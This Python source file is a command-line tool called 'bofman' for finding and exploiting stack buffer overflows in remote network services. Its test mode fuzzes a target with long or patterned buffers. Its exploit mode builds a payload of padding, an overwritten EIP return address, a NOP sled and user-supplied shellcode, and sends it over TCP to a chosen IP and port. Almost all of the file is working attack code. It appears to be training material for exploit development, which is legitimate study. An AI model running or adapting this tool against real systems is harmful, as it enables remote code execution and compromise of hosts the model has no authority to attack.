#!/usr/bin/python3

from data import *
import argparse
import sys
import socket
import os.path

_parser = argparse.ArgumentParser(prog='bofman',description='investigate and exploit buffer overflows')
_parser.add_argument('ip',type=str,help='ip of remote target')
_parser.add_argument('port',type=int,help='remote port')
#_parser.add_argument('--mode',action='store',choices=['test','exploit'],required=True,)

_subparsers = _parser.add_subparsers(help='sub command help',dest='cmdlet')

test_parser = _subparsers.add_parser('test',help='options for test')
test_parser.add_argument('--len',type=int,help='size of buffer to send',default=1024)
test_parser.add_argument('--buffer-type',type=str,choices=['a','pattern'],help='type of buffer to send',default='a')
test_parser.add_argument('--command',type=str,help='server command to prepend buffer with')

exploit_parser = _subparsers.add_parser('exploit',help='options for exploit')
exploit_parser.add_argument('--len',type=int,help='size of buffer to send',required=True)
exploit_parser.add_argument('--offsetEIP',type=int,help='how many bytes to write before EIP',required=True)
exploit_parser.add_argument('--eip',type=str,help='memory location to overwrite EIP',required=True)
exploit_parser.add_argument('--shellcode',type=str,help='path to shellcode in raw binary form',required=True)
exploit_parser.add_argument('--shellcodeOffset',type=int,help='offset to begin shellcode',required=True)
exploit_parser.add_argument('--nops',type=int,help='offset to begin shellcode')
exploit_parser.add_argument('--command',type=str,help='server command to prepend buffer with')


query_parser = _subparsers.add_parser('q',help='query for offsets')
query_parser.add_argument('query',type=str,help='find for offset for query string')

args = _parser.parse_args()

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)


if __name__ == '__main__':
	print(args)
	if(args.cmdlet=='test'):
		print('test')
		if(args.buffer_type=='a'):
			if(args.command == None):
				buffer=b'A'*args.len
			else:
				buffer = args.command.encode()+b' '+b'A'*args.len

		elif(args.buffer_type=='pattern'):
			if(args.command==None):
				buffer=pattern[0:args.len]
			else:
				buffer = args.command.encode()+b' '+pattern[0:args.len]
		print('prepared buffer is:{0}...{1}'.format(buffer[0:10],buffer[len(buffer)-10:-1]))
		try:
			sock.connect((args.ip,args.port))
			sock.send(buffer)
			sock.close()
			print('\n successfully sent buffer of length:{}'.format(len(buffer)))
		except ConnectionRefusedError:
			print('\nconnection refused, check IP and PORT')

	elif(args.cmdlet=='exploit'):
		print('exploit')

		nop = b'\x90'

		#check nops
		if(args.nops == None):
			nops=0
		else:
			nops=args.nops

		#repack eip
		eip = bytes.fromhex(args.eip)[::-1] #convert string representation of memory address to bytes and reverses for little endian

		#place server command
		if(args.command==None):
			buffer = b''
		else:
			buffer = args.command.encode()

		#check shellcode
		if(not os.path.isfile(args.shellcode)):
			print('shellcode file does not exist! quitting...')
			sys.exit(1)
		else:
			shellcode_file = open(args.shellcode,'rb')
			shellcode = shellcode_file.read()
			shellcode_file.close()

		if(args.offsetEIP + 4 == args.shellcodeOffset):
			buffer += b'A'*args.offsetEIP + eip + b'A'*(args.offsetEIP - args.shellcodeOffset + 4) + nop*nops + shellcode + b'A'*(args.len - args.offsetEIP - 4 - len(shellcode)-nops)
		elif(args.offsetEIP + 4 > args.shellcodeOffset):
			if(len(shellcode)+args.shellcodeOffset < args.offsetEIP):
				buffer += b'A'*(args.shellcodeOffset)+nop*nops+shellcode+b'A'*(args.offsetEIP - nops - args.shellcodeOffset - len(shellcode)) + eip + b'A'*(args.len - args.offsetEIP - 4)
			else:
				print('shellcode too big to fit before EIP! exiting...')
				sys.exit(1)
		else:
			print('it seems your offsets are off...try again or report a bug if you are sure...')
			sys.exit(1)

		print('prepared buffer is:{0}...{1}'.format(buffer[0:10],buffer[len(buffer)-10:-1]))

		try:
			sock.connect((args.ip,args.port))
			sock.send(buffer)
			sock.close()
			print('\n successfully sent buffer of length:{}'.format(len(buffer)))
		except ConnectionRefusedError:
			print('\nconnection refused, check IP and PORT')

	elif(args.cmdlet=='q'):
		print('query to be implemented')
